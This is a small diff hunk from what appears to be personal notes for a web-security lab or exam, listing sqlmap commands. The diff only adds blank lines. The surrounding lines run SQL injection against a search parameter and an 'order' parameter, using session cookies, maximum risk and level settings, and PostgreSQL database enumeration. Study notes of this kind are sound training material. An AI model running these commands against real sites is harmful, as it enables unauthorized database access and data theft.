@@ -131,6 +131,8 @@ SQLMAP options
 magia =  sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
 cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs
 
+
+
 sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'
 
 
